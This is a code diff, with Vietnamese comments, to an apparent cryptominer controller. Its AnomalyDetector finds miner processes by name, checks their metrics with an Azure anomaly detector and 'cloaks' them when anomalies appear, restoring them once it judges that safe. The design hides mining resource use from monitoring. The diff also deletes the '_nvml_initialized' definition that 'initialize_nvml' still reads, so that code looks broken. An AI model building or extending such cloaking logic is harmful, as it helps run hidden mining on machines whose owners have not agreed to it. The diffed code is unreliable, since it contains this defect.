@@ -26,16 +26,15 @@ from .auxiliary_modules.interfaces import IResourceManager
 #   QUẢN LÝ NVML TOÀN CỤC CHO MODULE (KHÔNG CÒN GPUManager RIÊNG)            #
 ###############################################################################
 
-_nvml_initialized = False
 
-def initialize_nvml():
-    """
-    Khởi tạo pynvml nếu chưa khởi tạo.
-    """
+_nvml_lock = asyncio.Lock()
+
+async def initialize_nvml():
     global _nvml_initialized
-    if not _nvml_initialized:
-        pynvml.nvmlInit()
-        _nvml_initialized = True
+    async with _nvml_lock:
+        if not _nvml_initialized:
+            pynvml.nvmlInit()
+            _nvml_initialized = True
 
 def is_nvml_initialized() -> bool:
     """Trả về True nếu pynvml đã khởi tạo."""
@@ -115,21 +114,34 @@ class AnomalyDetector:
         cpu_name = self.config.processes.get('CPU', '').lower()
         gpu_name = self.config.processes.get('GPU', '').lower()
 
-        async with self.mining_processes_lock:
-            self.mining_processes.clear()
-            for proc in psutil.process_iter(['pid', 'name']):
-                try:
-                    proc_name = proc.info['name'].lower()
-                    if cpu_name in proc_name or gpu_name in proc_name:
-                        priority = self.get_process_priority(proc.info['name'])
-                        net_if = self.config.network_interface
-                        mp = MiningProcess(proc.info['pid'], proc.info['name'], priority, net_if, self.logger)
-                        mp.is_cloaked = False
-                        self.mining_processes.append(mp)
-                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                    continue
+        retry_attempts = 3  # Số lần retry tối đa
+        for attempt in range(retry_attempts):
+            try:
+                async with self.mining_processes_lock:
+                    self.mining_processes.clear()
+                    for proc in psutil.process_iter(['pid', 'name']):
+                        try:
+                            proc_name = proc.info['name'].lower()
+                            if cpu_name in proc_name or gpu_name in proc_name:
+                                priority = self.get_process_priority(proc.info['name'])
+                                net_if = self.config.network_interface
+                                mp = MiningProcess(proc.info['pid'], proc.info['name'], priority, net_if, self.logger)
+                                mp.is_cloaked = False
+                                self.mining_processes.append(mp)
+                        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                            continue
 
-            self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")
+                    if not self.mining_processes:
+                        self.logger.warning("Không phát hiện tiến trình khai thác nào.")
+                    else:
+                        self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")
+                    return
+
+            except Exception as e:
+                self.logger.error(f"Lỗi discover_mining_processes_async (attempt {attempt + 1}): {e}")
+                if attempt == retry_attempts - 1:
+                    raise e
+                await asyncio.sleep(1)  # Chờ trước khi retry
 
     def get_process_priority(self, process_name: str) -> int:
         """Lấy độ ưu tiên của tiến trình dựa trên config."""
@@ -148,8 +160,6 @@ class AnomalyDetector:
         """
         Coroutine chính để phát hiện bất thường.
         """
-        detection_interval = self.config.monitoring_parameters.get("detection_interval_seconds", 3600)
-
         while not self.stop_event.is_set():
             try:
                 await self.discover_mining_processes_async()
@@ -158,7 +168,10 @@ class AnomalyDetector:
                         self.evaluate_process_anomaly(proc, cloak_delay=5)
                         for proc in self.mining_processes
                     ]
-                await asyncio.gather(*tasks)
+                if tasks:
+                    await asyncio.gather(*tasks)
+                else:
+                    self.logger.info("Không có tiến trình để kiểm tra bất thường.")
 
             except asyncio.CancelledError:
                 self.logger.info("Anomaly detection coroutine bị hủy.")
@@ -166,25 +179,30 @@ class AnomalyDetector:
             except Exception as e:
                 self.logger.error(f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}")
 
-            await asyncio.sleep(detection_interval)
+            await asyncio.sleep(self.config.monitoring_parameters.get("detection_interval_seconds", 3600))
 
     async def evaluate_process_anomaly(self, process: MiningProcess, cloak_delay: int):
-        """Đánh giá một tiến trình, nếu phát hiện bất thường => enqueue cloaking."""
+        """
+        Đánh giá một tiến trình, nếu phát hiện bất thường => enqueue cloaking.
+        """
         try:
             if not psutil.pid_exists(process.pid):
                 self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
                 return
 
-            if not self.resource_manager:
+            current_state = await self.resource_manager.collect_metrics(process)
+            if not current_state:
+                self.logger.warning(f"Không thu thập được metrics cho PID {process.pid}. Bỏ qua.")
                 return
 
-            current_state = await self.resource_manager.collect_metrics(process)
             anomalies_detected = await self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
             if anomalies_detected:
                 self.logger.warning(f"Phát hiện bất thường {process.name} (PID={process.pid}). Cloak sau {cloak_delay}s.")
                 await asyncio.sleep(cloak_delay)
                 await self.enqueue_cloaking(process)
                 process.is_cloaked = True
+            else:
+                self.logger.info(f"Không phát hiện bất thường cho PID={process.pid}.")
 
         except Exception as e:
             self.logger.error(f"Lỗi evaluate_process_anomaly PID={process.pid}: {e}\n{traceback.format_exc()}")
@@ -211,8 +229,7 @@ class AnomalyDetector:
 
     async def monitor_restoration(self):
         """
-        Coroutine để khôi phục tài nguyên cho các tiến trình đã bị cloak,
-        nếu đạt điều kiện an toàn. 
+        Coroutine để khôi phục tài nguyên cho các tiến trình đã bị cloak.
         """
         interval = 60
         while not self.stop_event.is_set():
@@ -222,18 +239,23 @@ class AnomalyDetector:
 
                 if self.safe_restore_evaluator and cloaked:
                     tasks = [self.safe_restore_evaluator.is_safe_to_restore(p) for p in cloaked]
-                    results = await asyncio.gather(*tasks)
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
 
-                    for proc, safe in zip(cloaked, results):
-                        if safe:
+                    for proc, result in zip(cloaked, results):
+                        if isinstance(result, Exception):
+                            self.logger.error(f"Lỗi khi kiểm tra khôi phục PID={proc.pid}: {result}")
+                            continue
+
+                        if result:
                             self.logger.info(f"Đủ điều kiện khôi phục cho PID={proc.pid}.")
                             await self.enqueue_restoration(proc)
                             proc.is_cloaked = False
                             self.logger.info(f"Đã khôi phục tài nguyên cho {proc.name} (PID={proc.pid}).")
+                        else:
+                            self.logger.info(f"PID={proc.pid} chưa đủ điều kiện để khôi phục.")
 
             except Exception as e:
                 self.logger.error(f"Lỗi monitor_restoration: {e}\n{traceback.format_exc()}")
-
             await asyncio.sleep(interval)
 
     async def stop(self):
